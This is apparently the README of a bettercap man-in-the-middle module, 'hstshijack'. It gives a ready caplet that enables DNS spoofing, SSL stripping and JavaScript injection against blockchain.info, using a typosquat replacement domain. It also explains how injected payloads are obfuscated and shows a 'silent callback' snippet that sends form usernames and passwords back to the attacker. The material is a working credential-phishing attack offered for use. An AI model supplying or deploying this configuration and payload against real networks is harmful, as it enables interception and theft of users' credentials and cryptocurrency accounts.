<p align="center">
  <img width="420px" src="https://cdn.rawgit.com/yungtravla/cdn/ccdc3b8d/github.com/bettercap/caplets/hstshijack/logo.svg" />
</p>

### Caplet

```sh
set hstshijack.log             caplets/hstshijack/ssl.log
set hstshijack.payload         caplets/hstshijack/payloads/hstshijack-payload.js
set hstshijack.ignore          *
set hstshijack.targets         blockchain.info,*.blockchain.info
set hstshijack.replacements    blockchian.info,*.blockchian.info
#set hstshijack.blockscripts    domain.com,*.domain.com
set hstshijack.custompayloads  *:caplets/hstshijack/payloads/sslstrip.js

set http.proxy.script  caplets/hstshijack/hstshijack.js
#set net.sniff.output   hstshijack0001.pcap
set net.sniff.verbose  false
set dns.spoof.all      true
net.sniff    on
dns.spoof    on
http.proxy   on
```

### Core payload

This module injects HTML & JS files with a payload (<a href="./payloads/hstshijack-payload.js">**hstshijack-payload.js**</a>) that communicates with this module, revealing all URLs that are discovered in the injected document.

This is done in separate and asynchronous requests so that the bettercap proxy can adjust the host and path for each request, and send a HEAD request to learn each host's response headers for a HTTP request.

### Custom payloads

You can also inject your own JavaScript payload(s) into HTML & JS files from targeted hosts by assigning them to the `hstshijack.custompayloads` variable.

Example:

```sh
hstshijack.custompayloads *:caplets/hstshijack/payloads/sslstrip.js,google.com:caplets/hstshijack/payloads/google.js,*.google.com:caplets/hstshijack/payloads/google.js
```

Once the payload is injected into a page, you can technically phish any data unless the client navigates to a URL that either has strict transport security rules enforced by their browser, or the URL was not stripped due to JavaScript security.

<a href="./payloads/sslstrip.js">**sslstrip.js**</a> is included, which strips the `s` from all `https://` instances in `<a href="...` tags.

### Obfuscation

Your custom payloads are automatically obfuscated by the module.

Any instance beginning with `obf_` will be obfuscated.


Example: 

```js
function obf_function() {
  alert("Random variable: obf_whatever_follows")
}

obf_function()
```

Will be injected as:

```js
function jfIleNwmKoa() {
  alert("Random variable: AsjZnJWklwMNqshCaloE")
}

jfIleNwmKoa()
```

### Silent callbacks

You can write custom payloads that communicate with bettercap without alerting the host.

Example of a silent callback:

```js
form.onsubmit = function() {
  req = new XMLHttpRequest()
  req.open("POST", "http://" + location.host + "/obf_path_callback?username=" + username + "&password=" + password)
  req.send()
}
```
<sup>Note: Every instance of `obf_path_callback` will be replaced with the callback path & every instance of `obf_path_ssl_log` will be replaced with the SSL log path.</sup>

The code above will send a POST request that will be sniffed by bettercap, but not proxied. 

As soon as bettercap receives a silent callback, any request for the targeted host will no longer be spoofed for that client.

### Block scripts

In the <a href="./hstshijack.cap">**caplet file**</a> you can block JavaScript on hosts by assigning them to the `hstshijack.blockscripts` variable. _(wildcard allowed)_ 

### SSL log

If a host responds with a HTTPS redirect, the module saves this host in the SSL log, and bettercap will from then on spoof SSL connections for this host when possible.

### Hostname spoofing

In the <a href="./hstshijack.cap">**caplet file**</a> you can assign comma separated domains to the `hstshijack.targets` variable. _(wildcard allowed)_

For every hostname you assign to `hstshijack.targets` you must assign a replacement domain to the `hstshijack.replacements` variable.

Example:

```sh
set hstshijack.targets       blockchain.info,*.blockchain.info
set hstshijack.replacements  blockchian.info,*.blockchian.info
```

You can try to make them as unnoticeable or obvious as you like, but your options are limited here.
